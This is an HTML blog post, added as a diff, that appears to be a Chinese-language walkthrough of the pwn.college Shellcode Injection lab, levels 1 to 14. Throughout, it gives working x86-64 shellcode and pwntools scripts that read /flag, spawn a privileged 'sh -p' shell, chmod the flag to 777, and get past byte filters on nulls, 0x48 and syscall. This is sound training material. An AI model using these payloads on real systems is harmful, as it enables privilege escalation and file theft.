@@ -1,0 +1,482 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/df32.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/df16.ico">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"dreamfo1l.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="pwn.college Shellcode Injection Module">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Shellcode Injection">
+<meta property="og:url" content="https://dreamfo1l.github.io/2022/11/23/Shellcode-Injection/index.html">
+<meta property="og:site_name" content="dreamfoil">
+<meta property="og:description" content="pwn.college Shellcode Injection Module">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-11-22T16:03:43.000Z">
+<meta property="article:modified_time" content="2022-11-22T16:06:11.764Z">
+<meta property="article:author" content="dreamfoil">
+<meta property="article:tag" content="PwnCollege">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://dreamfo1l.github.io/2022/11/23/Shellcode-Injection/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Shellcode Injection | dreamfoil</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">dreamfoil</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://dreamfo1l.github.io/2022/11/23/Shellcode-Injection/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="dreamfoil">
+      <meta itemprop="description" content="独立之精神，自由之思想。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="dreamfoil">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Shellcode Injection
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-11-23 00:03:43 / 修改时间：00:06:11" itemprop="dateCreated datePublished" datetime="2022-11-23T00:03:43+08:00">2022-11-23</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>pwn.college Shellcode Injection Module</p>
+<span id="more"></span>
+
+<h3 id="level-1-无限制"><a href="#level-1-无限制" class="headerlink" title="level 1 无限制"></a>level 1 无限制</h3><p>提示stdin从读入shellcode并加载到栈上执行。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.global _start</span><br><span class="line">_start:</span><br><span class="line">.intel_syntax noprefix</span><br><span class="line">        mov rax,2				// OPEN</span><br><span class="line">        mov rbx,0x67616c662f    &quot;/flag&quot;</span><br><span class="line">        push rbx			</span><br><span class="line">        mov rdi,rsp</span><br><span class="line">        mov rsi,0				</span><br><span class="line">        syscall</span><br><span class="line">        mov rsi,rax</span><br><span class="line">        mov rax,40			// SENDFILE</span><br><span class="line">        mov rdi,1				//stdout</span><br><span class="line">        xor rdx,rdx			//offset</span><br><span class="line">        mov r10,100			//output length</span><br><span class="line">        syscall</span><br><span class="line">        mov rax,60			//EXIT</span><br><span class="line">        syscall</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>编译命令</p>
+<p><code> gcc -stdlib -static demo.s democat</code></p>
+<p>提取shellcode</p>
+<p><code> objcopy --dump-section .text=shellcode democat</code></p>
+<p>输入shellcode</p>
+<p><code> cat shellcode | /challenge/babyshell_level1</code></p>
+<p><strong>python 实现</strong></p>
+<p><em><strong>shellcraft.cat(“&#x2F;flag”)</strong></em>  得到如下汇编</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">/* push b&#x27;/flag\x00&#x27; */</span><br><span class="line">mov rax, 0x101010101010101</span><br><span class="line">push rax</span><br><span class="line">mov rax, 0x101010101010101 ^ 0x67616c662f</span><br><span class="line">xor [rsp], rax</span><br><span class="line">/* call open(&#x27;rsp&#x27;, &#x27;O_RDONLY&#x27;, &#x27;rdx&#x27;) */</span><br><span class="line">push SYS_open /* 2 */</span><br><span class="line">pop rax</span><br><span class="line">mov rdi, rsp</span><br><span class="line">xor esi, esi /* O_RDONLY */</span><br><span class="line">syscall</span><br><span class="line">/* call sendfile(1, &#x27;rax&#x27;, 0, 0x7fffffff) */</span><br><span class="line">mov r10d, 0x7fffffff</span><br><span class="line">mov rsi, rax</span><br><span class="line">push SYS_sendfile /* 0x28 */</span><br><span class="line">pop rax</span><br><span class="line">push 1</span><br><span class="line">pop rdi</span><br><span class="line">cdq /* rdx=0 */</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
+
+<p><strong>python 代码</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">from pwn import * </span><br><span class="line">context.arch = &quot;amd64&quot;</span><br><span class="line"></span><br><span class="line">p = process(&quot;/challenge/babyshell_level1&quot;)</span><br><span class="line">cat = shellcraft.cat(&quot;/flag&quot;)</span><br><span class="line"></span><br><span class="line">p.send(asm(cat))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="level-2-nop"><a href="#level-2-nop" class="headerlink" title="level 2  nop"></a>level 2  nop</h3><p>This challenge will randomly skip up to 0x800 bytes in your shellcode. </p>
+<p>随机跳过最多0x800字节</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;/challenge/babyshell_level1&quot;</span>)</span><br><span class="line">cat = shellcraft.cat(<span class="string">&quot;/flag&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.send(asm(<span class="string">&quot;nop&quot;</span>)*<span class="number">0x800</span> +asm(cat))  <span class="comment">#0x800个nop</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="level-3-不能存在NULL"><a href="#level-3-不能存在NULL" class="headerlink" title="level 3 不能存在NULL"></a>level 3 不能存在NULL</h3><p>This challenge requires that your shellcode have no NULL bytes</p>
+<p>shellcraft生成的就不带null。下面手动改一遍</p>
+<h4 id="传常数不包括NULL"><a href="#传常数不包括NULL" class="headerlink" title="传常数不包括NULL"></a>传常数不包括NULL</h4><p>来回异或一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov rbx,0x67616c662f     |          mov rbx,0x1010101010101010</span><br><span class="line">push rbx                 |					push rbx</span><br><span class="line">mov rdi,rsp              |  				mov rax,0x67616c662f ^ 0x1010101010101010</span><br><span class="line">                         |          xor [rsp],rax</span><br><span class="line">                         |          mov rdi,rsp  		</span><br></pre></td></tr></table></figure>
+
+<h4 id="寄存器置0"><a href="#寄存器置0" class="headerlink" title="寄存器置0"></a>寄存器置0</h4><p><code> mov rsi,0  -&gt;  xor rsi,rsi</code></p>
+<h4 id="寄存器赋值"><a href="#寄存器赋值" class="headerlink" title="寄存器赋值"></a>寄存器赋值</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov rax,2        -&gt;  			xor rax,rax</span><br><span class="line">													mov al,2</span><br></pre></td></tr></table></figure>
+
+<h4 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">.global _start</span><br><span class="line">_start:</span><br><span class="line">.intel_syntax noprefix</span><br><span class="line">        mov rbx,0x1010101010101010</span><br><span class="line">        push rbx</span><br><span class="line">        mov rax,0x67616c662f ^ 0x1010101010101010</span><br><span class="line">        xor [rsp],rax</span><br><span class="line">        mov rdi,rsp  </span><br><span class="line">        xor rsi,rsi</span><br><span class="line">        xor rax,rax</span><br><span class="line">        mov al,2</span><br><span class="line">        syscall</span><br><span class="line">        mov rsi,rax</span><br><span class="line">        xor rax,rax</span><br><span class="line">        mov al,40</span><br><span class="line">        xor rdi,rdi</span><br><span class="line">        mov dil,1</span><br><span class="line">        xor rdx,rdx</span><br><span class="line">        mov r10B,100</span><br><span class="line">        syscall</span><br><span class="line">        xor rax,rax</span><br><span class="line">        mov al,60</span><br><span class="line">        syscall </span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="level-4-不含-0x48"><a href="#level-4-不含-0x48" class="headerlink" title="level 4  不含 (0x48)"></a>level 4  不含 (0x48)</h3><p>This challenge requires that your shellcode have no H bytes!</p>
+<p>0x48 通常在x64中作为REX prefix 代表改变默认操作数大小，从32位到64位。</p>
+<p>原shellcode的所有mov xor 都是64位操作，所以都带有0x48。</p>
+<p>用push，pop 代替mov 和 xor</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">.global _start</span><br><span class="line">_start:</span><br><span class="line">.intel_syntax noprefix</span><br><span class="line">        push 2</span><br><span class="line">        pop rax				</span><br><span class="line">        mov r10,0x67616c662f    </span><br><span class="line">        push r10</span><br><span class="line">        push rsp</span><br><span class="line">        pop rdi	</span><br><span class="line">        push 0</span><br><span class="line">        pop rsi				</span><br><span class="line">        syscall</span><br><span class="line">        push rax</span><br><span class="line">        pop rsi</span><br><span class="line">        push 40</span><br><span class="line">        pop rax</span><br><span class="line">        push 1</span><br><span class="line">        pop rdi							</span><br><span class="line">        push 0</span><br><span class="line">        pop rdx			</span><br><span class="line">        mov r10,100			</span><br><span class="line">        syscall</span><br><span class="line">        push 60</span><br><span class="line">        pop rax</span><br><span class="line">        syscall </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id=""><a href="#" class="headerlink" title=""></a></h3><h3 id="level-5-6-限制syscall"><a href="#level-5-6-限制syscall" class="headerlink" title="level 5 6 限制syscall"></a>level 5 6 限制syscall</h3><p><em><strong>shellcraft.pushstr_array(“rsi”,[“sh”,”-p”])</strong></em>  </p>
+<p>将字符串放入栈中，并将地址存放在指定寄存器中。这里生成execve的参数。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mov rax, 0x101010101010101</span><br><span class="line">push rax</span><br><span class="line">mov rax, 0x101010101010101 ^ 0x702d006873</span><br><span class="line">xor [rsp], rax</span><br><span class="line">xor esi, esi /* 0 */</span><br><span class="line">push rsi /* null terminate */</span><br><span class="line">push 0xb</span><br><span class="line">pop rsi</span><br><span class="line">add rsi, rsp</span><br><span class="line">push rsi /* &#x27;-p\x00&#x27; */</span><br><span class="line">push 0x10</span><br><span class="line">pop rsi</span><br><span class="line">add rsi, rsp</span><br><span class="line">push rsi /* &#x27;sh\x00&#x27; */</span><br><span class="line">mov rsi, rsp</span><br></pre></td></tr></table></figure>
+
+<p>无法使用<strong>syscall(0x50f)</strong>,那么就用0x50e，然后inc一下。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov rbx,0x50e</span><br><span class="line">inc rbx</span><br><span class="line">push rbx</span><br><span class="line">call rsp   </span><br></pre></td></tr></table></figure>
+
+<p>上面是用execve函数开启 sh -p root权限的shell来查看flag</p>
+<p><strong>下面改之前的open 和sendfile 的版本</strong></p>
+<p>这里是两次调用，所以要把ret也放到栈上。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">.global _start</span><br><span class="line">_start:</span><br><span class="line">.intel_syntax noprefix</span><br><span class="line">        mov rax,2			</span><br><span class="line">        mov rbx,0x67616c662f   </span><br><span class="line">        push rbx			</span><br><span class="line">        mov rdi,rsp</span><br><span class="line">        mov rsi,0				</span><br><span class="line">        mov rbx,0x00c3050e   /*050e+1 是syscall 00c3是ret，*/</span><br><span class="line">        inc rbx</span><br><span class="line">        push rbx</span><br><span class="line">        call rsp</span><br><span class="line">        mov rsi,rax</span><br><span class="line">        mov rax,40			</span><br><span class="line">        mov rdi,1				</span><br><span class="line">        xor rdx,rdx			</span><br><span class="line">        mov r10,100							</span><br><span class="line">        mov rbx,0x00c3050e</span><br><span class="line">        inc rbx</span><br><span class="line">        push rbx</span><br><span class="line">        call rsp</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="level-7-限制stdin-stdout"><a href="#level-7-限制stdin-stdout" class="headerlink" title="level 7 限制stdin stdout"></a>level 7 限制stdin stdout</h3><p>chmod修改权限</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">import</span> glob </span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;/challenge/babyshell_level7&quot;</span>)</span><br><span class="line">sh = shellcraft.execve(<span class="string">&#x27;/bin/chmod&#x27;</span>,[<span class="string">&#x27;chmod&#x27;</span>,<span class="string">&quot;777&quot;</span>,<span class="string">&quot;/flag&quot;</span>])</span><br><span class="line"></span><br><span class="line">p.send(asm(sh))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="-1"><a href="#-1" class="headerlink" title=""></a></h3><h3 id="level-8-限制字节数最大0x12"><a href="#level-8-限制字节数最大0x12" class="headerlink" title="level 8 限制字节数最大0x12"></a>level 8 限制字节数最大0x12</h3><p>chmod在操作软链接时不会作用于软链接，而会直接作用于所指向的文件，这样就不用输入<code>/flag</code>这5个字节了，只需要使用任意自定义一个字节即可</p>
+<p>ln -s &#x2F;flag s  生成一个软连接，对该软连接操作chmod</p>
+<p><strong>chmod(“s”,0o4)</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.global _start</span><br><span class="line">_start:</span><br><span class="line">.intel_syntax noprefix</span><br><span class="line">    push 0x73  /* s */</span><br><span class="line">    mov rdi, rsp</span><br><span class="line">    push 4</span><br><span class="line">    pop rsi</span><br><span class="line">    push 0x5a </span><br><span class="line">    pop rax</span><br><span class="line">    syscall</span><br><span class="line">  </span><br></pre></td></tr></table></figure>
+
+<p>13个字节</p>
+<h3 id="level-13-限制字节数最大0xc"><a href="#level-13-限制字节数最大0xc" class="headerlink" title="level 13 限制字节数最大0xc"></a>level 13 限制字节数最大0xc</h3><p>level 8  减少一个字节，（push 0x5a ，pop rax ）改为 （mov al,0x5a) </p>
+<h3 id="level-9-跳过"><a href="#level-9-跳过" class="headerlink" title="level 9 跳过"></a>level 9 跳过</h3><p>This challenge modified your shellcode by overwriting every other 10 bytes with 0xcc</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">.global _start</span><br><span class="line">_start:</span><br><span class="line">.intel_syntax noprefix</span><br><span class="line">    push 0x73  /* s */</span><br><span class="line">    mov rdi, rsp</span><br><span class="line">    push 4</span><br><span class="line">    pop rsi</span><br><span class="line">    jmp next</span><br><span class="line">    .rept 10</span><br><span class="line">    nop</span><br><span class="line">    .endr</span><br><span class="line">    next:</span><br><span class="line">    mov al,0x5a</span><br><span class="line">    syscall</span><br><span class="line">    </span><br></pre></td></tr></table></figure>
+
+<h3 id="level-12-每个字节不相同"><a href="#level-12-每个字节不相同" class="headerlink" title="level 12 每个字节不相同"></a>level 12 每个字节不相同</h3><p>用level13 的代码来改。</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.global</span> _start</span><br><span class="line"><span class="symbol">_start:</span></span><br><span class="line"><span class="meta">.intel_syntax</span> noprefix</span><br><span class="line">    <span class="keyword">push</span> <span class="number">0x73</span>  /* s /flag的软连接 */</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>,<span class="built_in">rsp</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">si</span>,<span class="number">0x4</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">al</span>,<span class="number">0x5a</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line">    </span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="level-14-限制6个字节"><a href="#level-14-限制6个字节" class="headerlink" title="level 14 限制6个字节"></a>level 14 限制6个字节</h4><p>rax默认为0，rdx为shellcode加载的地址。</p>
+<p>read(0,rsi,rdx) </p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[LEAK] Mapping shellcode memory <span class="meta">at</span> <span class="number">0x16401000</span>!</span><br><span class="line"><span class="built_in">rax</span>            <span class="number">0x0</span>                 </span><br><span class="line"><span class="built_in">rbx</span>            <span class="number">0x563fd68467e0</span>     </span><br><span class="line"><span class="built_in">rcx</span>            <span class="number">0x7f55234d5077</span>      </span><br><span class="line"><span class="built_in">rdx</span>            <span class="number">0x16401000</span>          </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.global _start</span><br><span class="line">_start:</span><br><span class="line">.intel_syntax noprefix</span><br><span class="line">    xor edi,edi</span><br><span class="line">    mov esi,edx</span><br><span class="line">    syscall</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">.global _start</span><br><span class="line">_start:</span><br><span class="line">.intel_syntax noprefix</span><br><span class="line">    nop			/* 前6个字节已经运行过了 这里跳过 */</span><br><span class="line">    nop</span><br><span class="line">    nop</span><br><span class="line">    nop</span><br><span class="line">    nop</span><br><span class="line">    nop</span><br><span class="line">    push 0x73  /* s */</span><br><span class="line">    mov rdi, rsp</span><br><span class="line">    push 4</span><br><span class="line">    pop rsi</span><br><span class="line">    push 0x5a </span><br><span class="line">    pop rax</span><br><span class="line">    syscall</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p><em><strong>cat shellread shellcode2 | &#x2F;challenge&#x2F;babyshell_level14</strong></em> </p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/PwnCollege/" rel="tag"># PwnCollege</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/11/03/Sessions-Desktops-and-Windows-Stations/" rel="prev" title="Sessions概念,穿透Session隔离">
+      <i class="fa fa-chevron-left"></i> Sessions概念,穿透Session隔离
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#level-1-%E6%97%A0%E9%99%90%E5%88%B6"><span class="nav-text">level 1 无限制</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level-2-nop"><span class="nav-text">level 2  nop</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level-3-%E4%B8%8D%E8%83%BD%E5%AD%98%E5%9C%A8NULL"><span class="nav-text">level 3 不能存在NULL</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BC%A0%E5%B8%B8%E6%95%B0%E4%B8%8D%E5%8C%85%E6%8B%ACNULL"><span class="nav-text">传常数不包括NULL</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AF%84%E5%AD%98%E5%99%A8%E7%BD%AE0"><span class="nav-text">寄存器置0</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AF%84%E5%AD%98%E5%99%A8%E8%B5%8B%E5%80%BC"><span class="nav-text">寄存器赋值</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BB%93%E6%9E%9C"><span class="nav-text">结果</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level-4-%E4%B8%8D%E5%90%AB-0x48"><span 